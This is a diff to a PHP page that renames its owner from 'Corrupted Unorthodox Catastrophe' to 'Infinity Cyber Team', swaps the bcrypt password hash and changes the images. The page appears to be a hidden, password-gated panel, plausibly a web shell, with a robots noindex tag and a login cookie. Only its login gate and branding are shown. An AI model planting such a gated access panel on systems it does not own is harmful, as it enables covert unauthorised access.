@@ -1,5 +1,5 @@
 <?php
-// This script is part of Corrupted Unorthodox Catastrophe (CUC) - Best Script.
+// This script is part of Infinity Cyber Team (CUC) - Best Script.
 // 
 // CUC - Best Script is free software: you can redistribute it and/or modify
 // it under the terms of The PHP License, version 3.01.
@@ -13,7 +13,7 @@
 // along with CUC - Best Script. If not, see <https://www.php.net/license/3_01.txt>.
 
 /**
- * Corrupted Unorthodox Catastrophe (CUC) - Best Script
+ * Infinity Cyber Team (CUC) - Best Script
  * @link https://cuc.dev/
  * @author CUC.
  * @since 17. 7. 1337 - time 13:37
@@ -95,7 +95,7 @@ if (is_logged_in()) {
 } else { 
     if (isset($_POST['password'])) { 
         $entered_key = $_POST['password']; 
-        $hashed_key = '$2y$10$SfhPX6Z60jr8B4y9q1n6L.T8./5Oxz42qiNw.xL1qTXCuxEpSivbi'; // https://bcrypt.online/ 
+        $hashed_key = '$2y$10$SGG8DHNj2omh5MXNehg3m.f77uiOkRkXIOS.1KBRJEAGA4dvmMH6i'; // https://bcrypt.online/ 
         if (password_verify($entered_key, $hashed_key)) { 
             setcookie('coxphe', 'coxphe', time() + 3600, '/'); 
             header("Location: ".$_SERVER['PHP_SELF']); 
@@ -111,7 +111,7 @@ if (is_logged_in()) {
     <meta name="robots" content="noindex, nofollow, noarchive">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="icon" href="https://i.pinimg.com/736x/52/1b/f7/521bf72a3882a26e6a5c9246f274fed8.jpg">
+    <link rel="icon" href="https://scontent-cgk1-2.xx.fbcdn.net/v/t1.6435-9/87048302_531940970782738_2954240718513635328_n.jpg?_nc_cat=111&ccb=1-7&_nc_sid=833d8c&_nc_ohc=_EWNS6bSKKoQ7kNvwEfUSs3&_nc_oc=Adn3MYTcV3vxems7t5i1wI0AG7NVyWpGQWT-zAVL7KBVJUd1NSkMIkcf1UI25B__v4c&_nc_zt=23&_nc_ht=scontent-cgk1-2.xx&_nc_gid=QYzDjFjcyfzszAUBzPwYLg&oh=00_AfHT6K2KuVsMqEPKpjYB0u6zONHWT6HegrWK0-fb4zR5bQ&oe=68393A0A">
     <link href="https://fonts.googleapis.com/css2?family=Cinzel&display=swap" rel="stylesheet">
     <title></title>
     <style>
@@ -201,9 +201,9 @@ if (is_logged_in()) {
   </head>
   <body>
     <div class="container">
-      <img id="clickableImage" src="https://i.pinimg.com/736x/52/1b/f7/521bf72a3882a26e6a5c9246f274fed8.jpg" width="500px" alt="Corrupted Unorthodox Catastrophe">
+      <img id="clickableImage" src="https://scontent-cgk1-2.xx.fbcdn.net/v/t1.6435-9/87048302_531940970782738_2954240718513635328_n.jpg?_nc_cat=111&ccb=1-7&_nc_sid=833d8c&_nc_ohc=_EWNS6bSKKoQ7kNvwEfUSs3&_nc_oc=Adn3MYTcV3vxems7t5i1wI0AG7NVyWpGQWT-zAVL7KBVJUd1NSkMIkcf1UI25B__v4c&_nc_zt=23&_nc_ht=scontent-cgk1-2.xx&_nc_gid=QYzDjFjcyfzszAUBzPwYLg&oh=00_AfHT6K2KuVsMqEPKpjYB0u6zONHWT6HegrWK0-fb4zR5bQ&oe=68393A0A" width="500px" alt="Infinity Cyber Team">
       <div id="linkContainer"></div>
-      <p>~ Corrupted Unorthodox Catastrophe ~</p>
+      <p>~ Infinity Cyber Team ~</p>
     </div>
   </body>
 </html>
